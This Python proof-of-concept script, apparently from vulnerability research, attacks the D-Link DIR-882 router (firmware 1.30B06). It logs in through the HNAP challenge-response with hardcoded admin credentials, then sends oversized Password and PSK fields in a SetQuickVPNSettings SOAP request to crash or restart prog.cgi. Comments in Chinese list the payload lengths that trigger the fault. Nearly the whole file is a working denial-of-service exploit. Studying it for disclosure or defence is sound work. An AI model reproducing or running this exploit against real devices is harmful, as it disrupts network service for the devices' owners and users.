#!/usr/bin/env python3

# dos_prog_cgi_dir882.py
# 
# Description: Sending payload of specific length will cause the prog.cgi to 
# restart(pid changed).
# 
# Firmware: DIR882A1_FW1.30B06fix03_220628
# Binary: /bin/prog.cgi
# SOAP Action: SetQuickVPNSettings
#
# sub_459F88->webGetVarString->decrypt_aes->sub_427184->0x427350->0x427410   0x45a0c8   0x427350   loop_dos
# sub_459F88->webGetVarString->decrypt_aes->sub_427184->0x427350->0x427410   0x45a0c8   0x427410   loop_dos
# sub_459F88->webGetVarString->decrypt_aes->sub_427184->0x427350->0x427410   0x45a118   0x427350   loop_dos
# sub_459F88->webGetVarString->decrypt_aes->sub_427184->0x427350->0x427410   0x45a118   0x427410   loop_dos
#
# Written by: ChinaNuke <ChinaNuke@nuke666.cn>
# Last updated on: 2022/11/15

import math
import re
import time
from hashlib import md5

import requests

IP = '192.168.0.1'
USERNAME = 'Admin'
PASSWORD = 'dir882$$'
REPEAT_TIMES = 1

trans_5C = bytes((x ^ 0x5c) for x in range(256))
trans_36 = bytes((x ^ 0x36) for x in range(256))
blocksize = md5().block_size

# Login logic copied from
# https://github.com/pr0v3rbs/CVE/blob/master/CVE-2018-19986%20-%2019990/poc.py


def hmac_md5(key, msg):
    key, msg = key.encode(), msg.encode()
    if len(key) > blocksize:
        key = md5(key).digest()
    key += b'\x00' * (blocksize - len(key))  # padding
    o_key_pad = key.translate(trans_5C)
    i_key_pad = key.translate(trans_36)
    return md5(o_key_pad + md5(i_key_pad + msg).digest())


def hnap_auth(soap_action, private_key):
    b = math.floor(int(time.time())) % 2000000000
    b = str(b)[:-2]
    h = hmac_md5(private_key, b + '"http://purenetworks.com/HNAP1/' +
                 soap_action + '"').hexdigest().upper()
    return h + " " + b

# 封装发送请求的过程


def send_request():
    pass


for i in range(REPEAT_TIMES):
    # 登录流程
    # 注意：SOAPAction不能少双引号，否则设备不认，会报401 Unauthorized.
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.5249.119 Safari/537.36',
        'Content-Type': 'text/xml; charset=UTF-8',
        'X-Requested-With': 'XMLHttpRequest',
        'SOAPAction': '"http://purenetworks.com/HNAP1/Login"'
    }

    payload = f'<?xml version="1.0" encoding="utf-8"?><soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/"><soap:Body><Login xmlns="http://purenetworks.com/HNAP1/"><Action>request</Action><Username>{USERNAME}</Username><LoginPassword></LoginPassword><Captcha></Captcha></Login></soap:Body></soap:Envelope>'

    r = requests.post(f'http://{IP}', data=payload, headers=headers)
    # print(r.text)

    challenge = re.search(r'<Challenge>(.*?)</Challenge>', r.text).group(1)
    cookie = re.search(r'<Cookie>(.*?)</Cookie>', r.text).group(1)
    publick_key = re.search(r'<PublicKey>(.*?)</PublicKey>', r.text).group(1)

    # print(f'challenge: {challenge}')
    # print(f'cookie: {cookie}')
    # print(f'publick_key: {publick_key}')

    private_key = hmac_md5(publick_key + PASSWORD,
                           challenge).hexdigest().upper()
    password = hmac_md5(private_key, challenge).hexdigest().upper()

    headers['HNAP_AUTH'] = hnap_auth("Login", private_key)
    headers['Cookie'] = f'uid={cookie}'
    payload = f'<?xml version="1.0" encoding="utf-8"?><soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/"><soap:Body><Login xmlns="http://purenetworks.com/HNAP1/"><Action>login</Action><Username>{USERNAME}</Username><LoginPassword>{password}</LoginPassword><Captcha></Captcha></Login></soap:Body></soap:Envelope>'

    r = requests.post(f'http://{IP}/HNAP1/', data=payload, headers=headers)
    if '<LoginResult>success</LoginResult>' in r.text:
        print('[*] Login successfully!')
    else:
        print('[!] Login failed!')

    # 触发漏洞流程
    # 大概是长度大于2--小于256的偶数会导致prog.cgi崩溃
    # 长度254会导致其崩溃，state变为zombie
    # password和psk都可以触发DoS
    # data_password = 'A' * 230
    data_password = 'f06f79c88309e4f9ebd42cacd685dee8ef6f79c88309e4f9ebd471acd6f0dee8ef6f79c88309e4f9ebd471acd6f0dee8ef6f79c88309e4f9ebd471acd6f0dee8'
    data_psk = 'B' * 230
    # data_psk = 'ca2379c8d7f5e407f2d443b8d69fe4e8ef6f79c88309e4f9ebd471acd6f0dee8ef6f79c88309e4f9ebd471acd6f0dee8ef6f79c88309e4f9ebd471acd6f0dee8'
    payload = f'''<?xml version="1.0" encoding="utf-8"?><soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/"><soap:Body><SetQuickVPNSettings xmlns="http://purenetworks.com/HNAP1/"><Enabled>true</Enabled><Username>vpn</Username><Password>{data_password}</Password><PSK>{data_psk}</PSK><AuthProtocol>MSCHAPv2</AuthProtocol><MPPE>None</MPPE></SetQuickVPNSettings></soap:Body></soap:Envelope>'''
    headers['SOAPAction'] = '"http://purenetworks.com/HNAP1/SetQuickVPNSettings"'
    headers['HNAP_AUTH'] = hnap_auth("SetQuickVPNSettings", private_key)
    r = requests.post(f'http://{IP}/HNAP1/', data=payload, headers=headers)
    print(r.text)

    # if REPEAT_TIMES > 1:
    #     time.sleep(1)